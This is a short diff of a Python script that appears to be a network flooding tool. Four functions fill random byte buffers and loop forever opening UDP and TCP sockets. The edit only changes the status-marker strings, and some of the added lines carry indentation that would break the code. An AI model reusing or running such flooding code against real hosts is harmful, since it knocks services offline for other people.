@@ -75,7 +75,7 @@ time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
-		i = random.choice(("[-]","[!]","[#]"))
+		i = random.choice(("[-]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -88,7 +88,7 @@ def run():
 
 def run2():
 	data = random._urandom(999)
-		i = random.choice(("[-]","[!]","[#]"))
+		i = random.choice(("[-]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -104,7 +104,7 @@ def run2():
 
 def run3():
 	data = random._urandom(818)
-		i = random.choice(("[-]","[!]","[#]"))
+		i = random.choice(("[-]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -120,7 +120,7 @@ def run3():
   
 def run4():
 	data = random._urandom(16)
-	i = random.choice(("[+]"))
+	i = random.choice(("[-]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
